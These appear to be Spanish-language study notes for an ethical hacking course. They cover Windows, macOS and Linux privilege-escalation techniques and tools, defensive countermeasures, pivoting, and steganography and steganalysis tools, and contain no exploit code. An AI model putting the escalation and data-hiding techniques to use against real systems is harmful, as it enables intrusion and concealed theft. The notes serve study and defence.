![Pasted image 20230909115419.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909115419.png)

## Exploit know vulnerabilities

Tools
	Robber
	PowerSploit


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



OSX
	Dylib hijadt
		Scanner to detect vuln
	Tool to make thje hijack
		OyUbhijack

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Spectre y Meltdown son vulnerabilidades encontradas en el diseño de los modernos chips procesadores de AMO, ARM e
Intel.

Vulnerabilidad Spectre
	Los atacantes pueden aprovechar esta vulnerabilidad para leer ubicaciones de memoria adyacentes de un proceso y acceder a información para la que no está autorizado.
	Usando esta vulnerabilidad, un atacante puede incluso leer la memoria del kernel o realizar un ataque basado en la web usando JavaScript.

Vulnerabilidad Meltdown
	Los atacantes pueden aprovecharse de esta vulnerabilidad para escalar privilegios forzando a un proceso sin privilegios a leer otras ubicaciones de memoria adyacentes como la memoria del kernel y la memoria física.
	Esto lleva a revelar información critica del sistema como credenciales, claves privadas, etc.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- In windows
- En el sistema operativo Windows, Named Pipe con nombre proporcionan una comunicación legítima entre los sistemas en ejecución.
- Los atacantes a menudo explotan esta técnica para escalar privilegios en el sistema de la víctima a los de una cuenta de usuario que tiene mayores privilegios de acceso.
- Los atacantes utilizan herramientas como Metasplolt para realizar una impersonación de tuberías con nombre en un host de target.ç 
- Los atacantes utilizan comandos de Metasplolt como getsystem para obtener privilegios de nivel administrativo y extraer los hashes de las contraseñas de las cuentas de administrador/usuario.

</div></div>

## ![[Unattended lnstalls \|Unattended lnstalls ]]
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Manipulación de tokens de acceso
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Aplicación Shimming
El marco de compatibilidad de aplicaciones de Windows llamado Shim se utiliza para proporcionar compatibilidad entre las versiones más
antiguas y más nuevas del sistema operativo Windows
Shims como RedirectEXE, injectDLL y GetProcAddress pueden ser utilizados por los atacantes para escalar privilegios, instalar puertas traseras,
desactivar Windows Defender, etc.
- Debilidad de los permisos del sistema de archivos
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones
peligrosas evadiendo la detección.
- Interceptación de rutas
Las aplicaciones incluyen muchas debilidades y desconfiguraciones como rutas no citadas, desconfiguración de variables de entorno de la ruta y
secuestro del orden de búsqueda que conducen a la interceptación de la ruta.
La interceptación de rutas ayuda a un atacante a mantener la persistencia en un sistema y escalar privilegios.
- Tarea programada
El Programador de Tareas de Windows junto con utilidades como 'at' y 'schtasks' pueden ser utilizados para programar programas que pueden
ser ejecutados en una fecha y hora específica.
El atacante puede utilizar esta técnica para ejecutar programas maliciosos al inicio del sistema, mantener la persistencia, realizar una ejecución
remota, escalar privilegios, etc.
- Lauch Deamon
Launchd se utiliza en el arranque de MacOS y OS X para completar el proceso de inicialización del sistema mediante la carga de parámetros para
cada daemon de lanzamiento a nivel de sistema.
Los daemons tienen plists que están vinculadas a ejecutables que se ejecutan en el arranque.
El atacante puede alterar el ejecutable del daemon de lanzamiento para mantener la persistencia o para escalar privilegios.
- Plist Modification
Los archivos plist en MacOS y OS X describen cuándo deben ejecutarse los programas, la ruta del archivo ejecutable, los parámetros del
programa, los permisos del sistema operativo necesarios, etc.
Los atacantes alteran los archivos plist para ejecutar código malicioso en nombre de un usuario legítimo para escalar privilegios.
- Web Shell
Una shell web es un script basado en la web que permite el acceso a un servidor web.
Los atacantes crean web shells para inyectar un script malicioso en un servidor web para mantener un acceso persistente y escalar privilegios.

![Pasted image 20230909124442.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909124442.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### BeRoot 
es una herramienta de post-explotación para comprobar las configuraciones  rróneas más comunes para encontrar una forma de elevar los privilegios. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre los permisos de los servicios, los directorios en los que se puede escribir con sus ubicaciones, los permisos de las claves de inicio, etc.
### linpostexp
La herramienta linpostexp obtiene información detallada sobre el kernel,
que puede ser utilizada para escalar privilegios en el sistema objetivo. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre el kernel, los sistemas de archivos, el superusuario, los sudoers, la versión de sudo, etc. Los atacantes pueden utilizar esta información para explotar las vulnerabilidades presentes en el kernel para elevar sus privilegios. El siguiente comando se utiliza para extraer esta información sobre el sistema de destino: #python linprivchecker.py


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



■ Restringir los privilegios de inicio de sesión interactiva.
■ Ejecutar usuarios y aplicaciones con los privilegios más bajos.
■ Implementar la autenticación y la autorización multifactoriales.
■ Ejecutar servicios como cuentas sin privilegios.
■ Implementar una metodología de separación de privilegios para limitar el alcance de los errores y fallos de
programación.
■ Utilizar una técnica de cifrado para proteger los datos sensibles.
■ Reducir la cantidad de código que se ejecuta con un determinado privilegio.
■ Realizar la depuración utilizando comprobadores de límites y pruebas de esfuerzo.
■ Probar a fondo el sistema para detectar errores de codificación de la aplicación y bugs.
■ Parchear y actualizar periódicamente el kernel.
■ Cambiar la configuración del UAC a "Siempre notificar", de modo que aumente la visibilidad del usuario
cuando se solicite la elevación del UAC.
■ Restringir a los usuarios la escritura de archivos en las rutas de búsqueda de las aplicaciones.
■ Supervisar continuamente los permisos del sistema de archivos mediante herramientas de auditoría.
■ Reducir los privilegios de las cuentas y grupos de usuarios para que sólo los administradores legítimos
puedan realizar cambios en el servicio.
■ Utilizar herramientas de listas blancas para identificar y bloquear el software malicioso que cambia los
permisos de archivos, directorios o servicios.
■ Utilizar rutas totalmente cualificadas en todas las aplicaciones de Windows.
■ Asegúrese de que los ejecutables ali se colocan en directorios protegidos contra escritura.
■ En los sistemas operativos Mac, impida que los archivos plist sean alterados por los usuarios haciéndolos de
sólo lectura.
■ Bloquear las utilidades del sistema no deseadas o el software que pueda utilizarse para programar tareas.
■ Parchear y actualizar regularmente los servidores web.
■ Desactivar la cuenta de administrador local por defecto.
■ Detectar, reparar y solucionar cualquier fallo o error que se ejecute en los servicios del sistema.

### Defender contra el abuso de los derechos sudo:
■ Implementar una política de contraseñas fuertes para los usuarios sudo.
■ Desactivar el almacenamiento en caché de las contraseñas estableciendo el timestamp_timeout en O, de
modo que cada vez que se ejecute sudo los usuarios deban introducir su contraseña.
■ Separar las cuentas administrativas de nivel sudo de las cuentas regulares del administrador, para evitar el
robo de contraseñas sensibles.
■ Actualizar los permisos y las cuentas de los usuarios a intervalos regulares.
■ Probar los usuarios sudo con acceso a programas que contengan parámetros para la ejecución de código
arbitrario.

</div></div>


# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Los atacantes utilizan la técnica de pivoteo para comprometer un sistema, obtener un acceso shell remoto en él, y además saltarse el firewall para pivotear a el sistema comprometido para acceder a otros sistemas vulnerables en la red.
- Los atacantes utilizan la técnica de retransmisión para acceder a recursos presentes en otros sistemas a través del sistema comprometido, de forma que las solicitudes de acceso a los recursos procedan del sistema inicialmente comprometido.
![Pasted image 20230909122520.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909122520.png)

![Pasted image 20230909123600.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123600.png)

![Pasted image 20230909123727.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123727.png)



</div></div>


</div></div>

# 12 Execution
Techniques that result in execution of attacker-controlled code on a local or remote system.
# 13 Credential Access
Techniques resulting in the access of, or control over, system, service or domain credentials.
# 14 Lateral Movement
Techniques that enable an adversary to horizontally access and control other remote systems.
# 15 Collection
Techniques used to identify and gather data from a target network prior to exfiltration.
# 16 Exfiltration
Techniques that result or aid in an attacker removing data from a target network.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía es una técnica de ocultar un mensaje secreto dentro de un mensaje ordinario y extraerlo en el destino para mantener la confidencialidad de los datos.
- Utilizar una imagen gráfica como portada es el método más popular para ocultar los datos en archivos.
- El atacante puede utilizar esteganografía para ocultar mensajes como una lista de los servidores comprometidos, código fuente para la herramienta de piratería, o planes para futuros ataques.
![Pasted image 20230910110916.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910110916.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



![Pasted image 20230910111003.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111003.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



 En la esteganografía de espacios en blanco, el usuario oculta los mensajes en el texto ASCII añadiendo espacios en blanco a los extremos de las líneas
- Como los espacios y los tabuladores no suelen ser visibles en los visualizadores de texto, el mensaje queda efectivamente oculto a los observadores casuales
- El uso de la encriptación incorporada hace que el mensaje sea ilegible aunque se detecte utilizar la herramienta SNOW para ocultar el mensaje.

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- En la esteganografía de imágenes, la información se oculta en archivos de imagen de diferentes formatos como .PNG, .JPG y .BMP
- Las herramientas de esteganografía de imágenes sustituyen los bits redundantes de los datos de la imagen por el mensaje de forma que el efecto no pueda ser detectado por el ser humano.
### Técnicas de esteganografía de archivos de imagen
![Pasted image 20230910111348.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111348.png)
![Pasted image 20230910111415.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111415.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía de documentos es la técnica de ocultar mensajes secretos transferidos en forma de documentos
- Incluye la adición de espacios en blanco y tabulaciones al final de las líneas
![Pasted image 20230910111458.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111458.png)
![Pasted image 20230910111524.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111524.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía de vídeo consiste en ocultar información secreta en un archivo de vídeo portador
- En la esteganografía de vídeo, la información se oculta en archivos de vídeo de diferentes formatos, como .AVI, .MPG4 y .WMV
- La manipulación de la transformada discreta de coseno (DCT) se utiliza para Añadir datos secretos en el momento del proceso de transformación del vídeo

### OmniHIdepro
OmniHide Pro oculta un archivo dentro de otro. Se puede ocultar cualquier archivo dentro de formatos comunes de imagen/música/vídeo/documento. El archivo de salida funcionará de la misma manera que el archivo fuente original

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



RT Steganography
StegoStick
OpenPuff
MSU Stego VIdeo

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía de audio consiste en ocultar información secreta en archivos de audio como .MP3, .RM y .WAV La información puede ocultarse en un archivo de audio utilizando LSB o usando frecuencias inaudibles para el oído humano (>20.000 Hz)
- Algunos de los métodos de esteganografía de audio son la ocultación de datos por eco, el método de espectro ensanchado, la codificación LSB, la inserción de tonos, la codificación de fase, etc.
### Deepsound
- DeepSound oculta datos secretos en archivos de audio - wave y flac
- Permite la extracción de archivos secretos directamente de las pistas de CD de audio

Existen ciertos métodos para ocultar sus mensajes secretos en archivos de audio. Algunos métodos implementan un
algoritmo que se basa en la inserción de la información secreta en forma de señal de ruido, mientras que otros métodos
creen en la explotación de sofisticadas técnicas de procesamiento de señales para ocultar la información.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



BitCrypt
StegoStick
Mp3Stego
QuickStego
QuickCrypto
Spectrology

</div></div>



</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



En la esteganografía de carpetas, los archivos se ocultan y encriptan dentro de una carpeta y no aparecen para las aplicaciones normales de Windows, incluido el Explorador de Windows.
### Gilisoft gile lock pro
bloquea archivos, carpetas y unidades, oculta archivos, carpetas y unidades para hacerlos invisibles o protege con contraseña archivos, carpetas y unidades

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Folder lock
Hide Folders 5
Invisible secrets 4
Max folder secure
QuickCrypto

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía de spam/correo electrónico se refiere a la técnica de enviar mensajes secretos ocultándolos en los mensajes de spam/correo electrónico
- Los correos electrónicos de spam ayudan a comunicarse en secreto incrustando los mensajes secretos de alguna manera y ocultando los datos incrustados en los correos electrónicos de spam
- Spam Mimic es una herramienta de esteganografía de spam/correo electrónico que codifica el mensaje secreto en un mensaje de spam de aspecto inocente

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Spy pix
pixelknot
pocket stego
Steganography image
Steganography

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- El esteganalisis es el arte de descubrir y representar mensajes encubiertos mediante la esteganografía
- Detecta los mensajes ocultos incrustados en medios portadores de imágenes, texto, audio y vídeo
### Challenges
- El flujo de información sospechoso puede tener o no datos ocultos codificados
- La detección eficiente y precisa del contenido oculto dentro de las imágenes digitales es difícil
- El mensaje podría estar codificado antes de ser insertado en un archivo o señal
- Algunas de las señales o archivos sospechosos pueden tener codificados datos irrelevantes o ruido
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Archivo de texto
En los archivos de texto se realizan alteraciones en las posiciones de los caracteres para ocultar los datos. Se pueden detectar estas alteraciones buscando patrones de texto o alteraciones, el idioma utilizado, la altura de las líneas o un número
inusual de espacios en blanco. Un simple procesador de textos puede a veces revelar la esteganografía de texto ya que muestra los espacios, tabulaciones y otros caracteres que distorsionan la presentación del texto durante la esteganografía de
texto.
- Archivo de imagen
La información oculta en una imagen puede detectarse determinando los cambios de tamaño, el formato del archivo, la última modificación, la marca de tiempo de la última modificación y la paleta de colores del archivo. 
- Archivo de audio
La esteganografía de audio es un proceso de incrustación de información  onfidencial, como documentos y archivos privados, en el sonido digital. Se pueden utilizar métodos de análisis estadístico para detectar la esteganografía de audio, ya
que implica modificaciones de LSB. Las frecuencias inaudibles pueden escanearse en busca de información oculta. Las distorsiones y patrones extraños muestran la existencia de datos secretos.
- Archivo de vídeo
La detección de datos secretos en archivos de vídeo incluye una combinación de los métodos utilizados en los archivos de imagen y audio. Los signos de código especiales y los gestos ayudan a detectar los datos secretos.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



StegoVeritas
stegextract
stegohunt
steganography studio
virtual steganography lab

</div></div>


</div></div>


</div></div>

# 17 Impact
Techniques aimed at manipulating, interrupting or destroying the target system or data.
# 18 Objectives
Socio-technical objectives of an attack that are intended to achieve a strategic goal.
